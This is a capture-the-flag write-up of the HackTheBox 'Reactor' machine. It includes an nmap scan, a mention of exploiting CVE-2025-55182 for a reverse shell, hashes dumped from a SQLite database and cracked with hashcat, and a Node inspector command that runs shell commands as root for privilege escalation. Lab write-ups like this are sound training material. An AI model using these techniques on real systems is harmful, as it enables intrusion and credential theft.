---
title: Reactor
machine: Reactor
date: 2026-05-24
category: [HackTheBox, Linux]
platform: HackTheBox
os: Linux
tags: [nmap, linPEAS, Wireshark]
difficulty: Easy
summary: Reactor is an easy rated box on Hack The Box
machine_url: https://app.hackthebox.com/machines/Reactor
achievement: https://labs.hackthebox.com/achievement/machine/1737280/900
---

# Reconnaissance
Nmap:
```bash
# Nmap 7.99 scan initiated Sun May 24 09:38:36 2026 as: /usr/lib/nmap/nmap --privileged -sVC -vv -p- -T4 -oN nmap-full 10.129.54.203
Increasing send delay for 10.129.54.203 from 0 to 5 due to 1031 out of 2576 dropped probes since last increase.
Increasing send delay for 10.129.54.203 from 5 to 10 due to 11 out of 11 dropped probes since last increase.
Nmap scan report for 10.129.54.203
Host is up, received reset ttl 63 (0.21s latency).
Scanned at 2026-05-24 09:38:37 +07 for 929s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIoh32XcLYi0Kdad12SajqVyUVXfkDPaB7zZCDCMIJc+fv8JUJwyQRoqX/91+p6uD75Ggdp4VNzA7WasIkyo/4U=
|   256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPws9RyzoCW2cXzOFxeZCCt8rWcNu2umX2kqLLK6T+7H
3000/tcp open  ppp?    syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Sun, 24 May 2026 02:53:51 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Sun, 24 May 2026 02:53:52 GMT
|     Connection: close
|   Help, NCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.99%I=7%D=5/24%Time=6A12683F%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,24EA,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-S
SF:tate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x2
SF:0Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\
SF:r\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nC
SF:ache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2017
SF:175\r\nDate:\x20Sun,\x2024\x20May\x202026\x2002:53:51\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta
SF:\x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\
SF:"/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next\"/
SF:><link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\x20
SF:href=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\x20
SF:src=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=\"\
SF:"></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead1\.
SF:js\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptio
SF:ns,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Rou
SF:ter-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetc
SF:h\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20n
SF:o-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Sun,
SF:\x2024\x20May\x202026\x2002:53:52\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20R
SF:SC,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-
SF:Segment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x
SF:20private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r
SF:\nDate:\x20Sun,\x2024\x20May\x202026\x2002:53:52\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 24 09:54:06 2026 -- 1 IP address (1 host up) scanned in 929.65 seconds
```
Exploit the React2Shell vulnerability (CVE-2025-55182) to gain the reverse shell.
in the same directory, saw a sqlite database (check .env) `reactor.db`.
interact:
```bash
sqlite3 reactor.db
sqlite> .databases
main: /opt/reactor-app/reactor.db r/w
sqlite> .tables
sensor_logs  users      
sqlite> select * from users;
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
sqlite>
```
Got some creds maybe can perform cracking
```bash
Dictionary cache built:
* Filename..: ../Computer Networks & Internet/Tools/SecLists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

39d97110eafe2a9a68639812cd271e8e:reactor1                 
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: hashes.txt
Time.Started.....: Sun May 24 15:39:01 2026 (1 sec)
Time.Estimated...: Sun May 24 15:39:02 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (../Computer Networks & Internet/Tools/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#05........: 14324.1 kH/s (4.93ms) @ Accel:669 Loops:1 Thr:64 Vec:1
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new)
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 0/14344384 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#05..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#05...: 122194sp -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.SMC.: Fan0: 69%, Fan1: 0%
Hardware.Mon.#05.: Temp: 56c Util: 16% Pwr:0mW
```
got the creds: engineer:reactor1
got ssh as engineer, got user flag.
```bash
engineer@reactor:/$ ps -U root -u root u | grep node
root        1418  0.0  1.2 1067476 48140 ?       Ssl  02:21   0:03 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
engineer@reactor:/$ ss -tuln
Netid        State         Recv-Q        Send-Q               Local Address:Port               Peer Address:Port        Process        
udp          UNCONN        0             0                       127.0.0.54:53                      0.0.0.0:*                          
udp          UNCONN        0             0                    127.0.0.53%lo:53                      0.0.0.0:*                          
udp          UNCONN        0             0                          0.0.0.0:68                      0.0.0.0:*                          
tcp          LISTEN        0             4096                    127.0.0.54:53                      0.0.0.0:*                          
tcp          LISTEN        0             511                      127.0.0.1:9229                    0.0.0.0:*                          
tcp          LISTEN        0             4096                       0.0.0.0:22                      0.0.0.0:*                          
tcp          LISTEN        0             4096                 127.0.0.53%lo:53                      0.0.0.0:*                          
tcp          LISTEN        0             511                              *:3000                          *:*                          
tcp          LISTEN        0             4096                          [::]:22                         [::]:*
```
The node debugger is known for unauthenticated RCE
Confirming with:
```bash
exec("process.mainModule.require('child_process').exec('touch /tmp/pwned')")
```
`/tmp/pwned` is then created and owned by root. 
now just use the same command to get a SUID-root bash to enter privileged root shell.